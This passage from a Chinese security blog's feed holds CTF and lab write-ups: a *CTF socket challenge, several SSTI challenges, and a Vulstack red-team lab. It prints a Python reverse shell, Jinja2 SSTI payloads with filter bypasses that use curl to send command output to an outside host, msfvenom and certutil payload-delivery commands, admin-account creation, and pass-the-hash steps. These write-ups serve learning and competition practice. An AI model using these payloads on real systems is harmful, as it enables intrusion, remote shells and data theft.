err重定向至socket。</p><p>详细的分析链接放在了最后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os </span><br><span class="line"> </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>本地监听搞起来，然后上传，得到反弹过来的shell</p><p>下面审计server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = <span class="built_in">open</span>(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>得到flag的条件是发送的数据为b’*ctf’</p><p>发现这个socket写的有些问题，连接大于2时就断开了，所以需要尝试自己写个socket连进去，防止别人在连，要一直循环。</p><p>于是得到如下client的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">&#x27;172.25.0.2&#x27;</span></span><br><span class="line">PORT=<span class="number">21587</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST,PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=<span class="string">b&#x27;*ctf&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">tcpCliSock.send(data)</span><br><span class="line">data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>但是有个问题，题目的服务器每两分钟重启一次，拿到shell后再装vim什么的太慢了，于是将脚本base64编码，</p><p>echo base64_encoded_script | base64 -d &gt;1.py</p><p>以这种方式将脚本内容上传至webserver，python3 1.py执行即可。</p><img src="http://cdn.polowong.top/static/images/xingctf.png"><p>我认为client.py 和client的容器是起迷惑作用 或者说是模拟别人在向server发送请求，所以在本地模拟时把client容器down掉就可以了。</p><p>为了验证这里一理论，我在题目的在线环境中通过webserver打到client服务器进行了LFI，发现并没有client.py，我认为上述说法成立。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当前还有个问题就是不知道是哪句话实现了删除文件前执行了文件里的内容。</p><p>参考链接：</p><p>雪宝wp</p><p><a href="https://blog.csdn.net/weixin_30526593/article/details/98650248">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl&lt;/p&gt;
&lt;h1 id=&quot;oh-my-socket&quot;&gt;&lt;a href=&quot;#oh-my-socket&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>近期ssti题目总结</title>
    <link href="https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/"/>
    <id>https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/</id>
    <published>2020-12-22T07:35:19.000Z</published>
    <updated>2021-01-06T13:34:04.259Z</updated>
    
    <content type="html"><![CDATA[<p>分析下近期做过的ssti题目的思路</p><h1 id="你的名字-题目分析"><a href="#你的名字-题目分析" class="headerlink" title="你的名字 题目分析"></a>你的名字 题目分析</h1><p>打开题目 发现输入名字</p><p>尝试输入4</p><p>报了一个php的错误</p><p>继续尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print 2*5 %&#125;</span><br></pre></td></tr></table></figure><p>成功.</p><p>下面将尝试利用ssti进行文件读取/命令执行</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print config%&#125;</span><br></pre></td></tr></table></figure><p>失败，返回值为空</p><p>尝试多个关键字后，发现是对黑名单关键词采取了置空的方法进行过滤，那么可以考虑在关键字中加入另一个关键字的方式，如 iconfigf 代表if。</p><p>首先获得所有子类</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.__claconfigss__.__mrconfigo__[<span class="number">2</span>].__subclconfigasses__()%&#125;</span><br></pre></td></tr></table></figure><p>拿到所有子类后，查找init global存在os模块的类，常见的是catch_warnings类</p><p>我这里用的是笨方法，将所有的子类打印出来后放到sublime里面找到的catch_warings类的下标为59</p><p>下面将进一步利用该类实现命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;ls &#x2F; |base64&#96;  &#39;)%&#125;</span><br><span class="line"></span><br><span class="line">通过curl外带命令执行的结果,获得了外带的根目录ls的结果，发现了flag的存放位置，直接getflag。</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125;</span><br></pre></td></tr></table></figure><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>介绍popen的用法</p><p>popen方法在os模块下，使用前需要import os</p><p>popen是从一个命令打开一个管道，返回值意味着执行结果，正常执行的话返回值为0</p><p>popen在ssti中常作为替代system进行命令执行的一种方式，现演示popen用法</p><img src="http://cdn.polowong.top/static/images/ssti4.png"><p>在此例中可以看到，调用os.popen.read()方法会返回执行系统命令的结果，而不是执行成功的返回值0</p><p>popen方法中subprocess模块下也有。</p><h1 id="安洵杯-normal-ssti"><a href="#安洵杯-normal-ssti" class="headerlink" title="安洵杯 normal_ssti"></a>安洵杯 normal_ssti</h1><p>首先看过滤了哪些关键字</p><img src="http://cdn.polowong.top/static/images/ssti1.png"><p>使用burp fuzz关键字，发现过滤了很多的关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先看过滤了&#123;&#123;,可以使用&#123;%print%&#125;</span><br></pre></td></tr></table></figure><p>的方式执行表达式</p><p>过滤了空格，可以用小括号的方式绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(1)%&#125;</span><br></pre></td></tr></table></figure><p>这里还过滤了.  可以用a t t r()绕过</p><p>其他的关键字可以考虑使用unicode编码绕过</p><p>lipsum方法globlas-builtins中存在os模块，可以直接执行命令。</p><p>首先构造未编码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure><p>然后构造编码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0077\u0068\u006f\u0061\u006d\u0069&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">接下来尝试读取flag：</span><br><span class="line"></span><br><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/ssti2.png"><h2 id="另一种思路"><a href="#另一种思路" class="headerlink" title="另一种思路"></a>另一种思路</h2><p>看了师傅们的解法，我在尝试另一种编码绕过的方式解决这个问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\137\137class\137\137%22)|attr(%22\137\137mro\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(1)|attr(%22\137\137subclasses\137\137%22)()|attr(%22\137\137\147etitem\137\137%22)(186)|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\137\137\147etitem\137\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br></pre></td></tr></table></figure><p>上述两种方法是通过找sys模块中的os进行命令执行。（膜一下师傅：）</p><h1 id="nctf-2020-ssti"><a href="#nctf-2020-ssti" class="headerlink" title="nctf 2020 ssti"></a>nctf 2020 ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>懒了，改一下上题的blacklist继续跑（doge</p><p>先用bp fuzz一下，发现过滤了很多关键字。</p><img src="http://cdn.polowong.top/static/images/ssti3.png"><p>根据上题思路，尝试unicode绕过对关键字的过滤，如</p><p>class -&gt;  \u0063\u006c\u0061\u0073\u0073</p><p>这种方法可以成功bypass。</p><p>官方wp的方法是用十六进制绕过，也是可以的，下面是用16进制绕过的pld：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\x5f\x5fcla%22+%22ss\x5f\x5f%22][%22\x5f\x5fmr%22+%22o\x5f\x5f%22][1][%22\x5f\x5fsubcla%22+%22sses\x5f\x5f%22]()[186][%22\x5f\x5fin%22+%22it\x5f\x5f%22][%22\x5f\x5fgloba%22+%22ls\x5f\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="unctf2020-ssti"><a href="#unctf2020-ssti" class="headerlink" title="unctf2020 ssti"></a>unctf2020 ssti</h1><p>blacklist:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ ] <span class="string">&#x27; &quot; _</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[] : __getitem__</span><br><span class="line"><span class="string">&#x27;和&quot;: request.args.xxx</span></span><br><span class="line"><span class="string">_: |attr()</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read</span><br></pre></td></tr></table></figure><h1 id="nctf-2020-你就是我的master吗"><a href="#nctf-2020-你就是我的master吗" class="headerlink" title="nctf 2020 你就是我的master吗"></a>nctf 2020 你就是我的master吗</h1><p>blacklist：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; . _ class base subclasses request</span></span><br></pre></td></tr></table></figure><p>绕过方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; :  &quot;&quot;</span></span><br><span class="line"><span class="string">. :[&quot;xxx&quot;] </span></span><br><span class="line"><span class="string">_:八进制 十六进制 Unicode 绕过 八进制如\137</span></span><br><span class="line"><span class="string">关键字： 字符串拼接 如 &quot;cla&quot;+&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:5000/?</span><br><span class="line">url=&#123;&#123;0[&quot;\137\137cla&quot;+&quot;ss\137\137&quot;][&quot;\137\137mro\137\137&quot;][1][&quot;\137\137subclas&quot;+&quot;ses\137\137&quot;]()[186][&quot;\137\137init\137\137&quot;][&quot;\137\137globals\137\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>flask/jinja2渲染殷勤的ssti问题考察更多的是对builtins函数/模块的使用以及了解程度，各种绕过过滤技巧 换而言之是对python语言基础语法的理解程度和面向对象思想的熟练程度。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;分析下近期做过的ssti题目的思路&lt;/p&gt;
&lt;h1 id=&quot;你的名字-题目分析&quot;&gt;&lt;a href=&quot;#你的名字-题目分析&quot; class=&quot;headerlink&quot; title=&quot;你的名字 题目分析&quot;&gt;&lt;/a&gt;你的名字 题目分析&lt;/h1&gt;&lt;p&gt;打开题目 发现输入名字&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VULSTACK 红队评估(二) </title>
    <link href="https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"/>
    <id>https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/</id>
    <published>2020-12-16T09:28:02.000Z</published>
    <updated>2020-12-16T09:30:37.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulstack红队评估（二）"><a href="#Vulstack红队评估（二）" class="headerlink" title="Vulstack红队评估（二）"></a>Vulstack红队评估（二）</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0/24</p><p>NAT网段为192.168.111.0/24</p><p>DC(内网)  网卡选择VMNET1，IPV4地址为  10.10.10.10    </p><p>WIN7(内网) 网卡选择VMNET1，IPV4地址为  10.10.10.20</p><p>WEBSERVER（内外网） 网卡1选择VMNET1，IPV4地址为10.10.10.80，网卡2选择NAT，DHCP auto configuration，本次地址为192.168.111.128</p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下存在三个批处理文件<code>setDomainEnv</code>，<code>startManagedWebLogic</code>，<code>stopManagedWebLogic</code>。点击配置weblogic环境。</p><p>启动服务后，访问web服务器ip:7001/console即可自动部署。</p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>进入weblogic页面后首先尝试弱口令weblogic/weblogic，登陆不进去，考虑使用weblogic扫描器。</p><img src="http://cdn.polowong.top/static/images/vs21.jpg"><p>通过扫描发现了CVE-2019-2725漏洞，尝试利用。</p><p>利用工具：</p><p><a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p><p>这个脚本有个问题，明明import了sys，requests等，但是运行的时候还是会报没有import，很奇怪，把它放到if name=main里面就好了（这里大概率是name==main带来的执行顺序的问题）</p><p>顺利运行脚本后，即可获得一个webshell，地址为：</p><p><a href="http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p><p>先用webshell查看systeminfo,发现为64位操作系统，尝试使用msfvenom生成64位的reverse shell</p><p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444  a- x64 -f exe &gt;/root/Desktop/shell.exe</p><p>kali启动apache服务，并将webshell放到/var/www/html目录下</p><p>利用Windows自带的工具 certutil下载webshell</p><p>certutil.exe -urlcache -split -f <a href="http://192.168.111.129/shell.exe">http://192.168.111.129/shell.exe</a></p><p>但是不行，直接被360干掉了。</p><p>使用java反序列化终极测试工具直接上传冰蝎shell，目录为</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\wlserver_10<span class="number">.3</span>\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/vs22.jpg"><p>可以直接连上~</p><p>下面将shell反弹到msf上，进行下一步的渗透。</p><h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>在meterpreter里面使用run get_local_subnets 获取服务器网卡信息</p><p>看到10网段，添加10网段路由：</p><p>run autoroute -s 10.10.10.0/24</p><p>然后启动socks代理</p><p>我这里对代理的理解是在msf启动socks5代理后，设置监听IP与端口，任何使用proxychains进行的动作都会转发到设置好的监听与端口上，与此同时msf设置了通往靶机内网的路由，便可将请求通过（命令）内网主机发送出去。</p><p>看一下net user /domain 发现了域内有五个用户</p><p>查询域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>通过ipconfig /all查询IP地址与DNS服务器地址（一般DNS服务器地址是DC）</p><p>使用net config workstation 查询工作站情况</p><img src="http://cdn.polowong.top/static/images/vs23.jpg"><p>可以确定，当前域为de1ay.com</p><p>接下来使用ladon探测内网主机存活情况</p><p>利用失败，无回显，在虚拟机查看发现被360拦截掉了。</p><p>由于java的meterpreter没有mimikatz模块，所以这里尝试上传Windows的shell并且加载mimikatz模块。（忘记了之前生成的shell被干掉了。。没办法，尝试免杀）</p><p>使用go免杀cs成功了，成功上线</p><img src="http://cdn.polowong.top/static/images/vs25.jpg"><p>接下来尝试添加管理员用户</p><p>net user polosec admin@123 /add</p><p>net localgroup Administrators polosec /add</p><p>由于360拦截 添加失败。</p><p>通过漏洞进行权限提升，拿到一个system权限的shell。</p><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><p>将cs会话派生给msf</p><p>首先CS新建一个foreign listener，选择https，记住设置的端口号和hsot。</p><p>msf一样的配置</p><p>注意这里一定要选reverse http 否则meterpreter会die</p><img src="http://cdn.polowong.top/static/images/vs26.jpg"><p>使用如下命令用ICMP协议探测主机存活：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用arp -a 查看arp缓存</p><img src="http://cdn.polowong.top/static/images/vs27.jpg"><p>确定主机大概为:</p><p>10.10.10.10(DC),</p><p>10.10.10.80,</p><p>10.10.10.201</p><p>目前10.10.10.80已经被拿下，下面尝试对10.10.10.10以及10.10.10.201主机进行渗透。</p><h2 id="渗透域内主机"><a href="#渗透域内主机" class="headerlink" title="渗透域内主机"></a>渗透域内主机</h2><p>通过PASS THE HASH 的方式传递NTLM hash实现上线DC和域内主机。</p><p>具体方法：</p><p>在CS中 view target -add 添加DC的IP，点击jump ，PS EXEC ，选择一个同域的账号密码进行PTH，即可顺利上线DC。</p><p>上线DC后再用mimikatz抓一下密码，然后利用同样的方法上线主机10.10.10.201。</p><img src="http://cdn.polowong.top/static/images/vs28.jpg"><p>顺利上线主机10.10.10.201：</p><img src="http://cdn.polowong.top/static/images/vs29.jpg"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次对vulstack靶场的学习，</p><p>进一步了解了CS MSF的用法，加深了对bypass uac 、提权的认识，学习了初步的免杀技巧；</p><p>学会了在msf中如何配置路由对内网进行扫描，学习了几个常用的提权方式 比如MS14058 MS15051；</p><p>使用pth的方式上线域内主机等等。。</p><p>目前存在的问题也非常多，包括不太了解CS，CS的shell掉线不知道是什么问题，以及还有很多很多现在还没有学习到的知识。</p><p>针对当前问题的学习目标：了解PTH，掌握mimikatz的用法，了解如何bypass uac，认识更多的提权方法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vulstack红队评估（二）&quot;&gt;&lt;a href=&quot;#Vulstack红队评估（二）&quot; class=&quot;headerlink&quot; title=&quot;Vulstack红队评估（二）&quot;&gt;&lt;/a&gt;Vulstack红队评估（二）&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>vulstack 红队评估(一) 内网渗透</title>
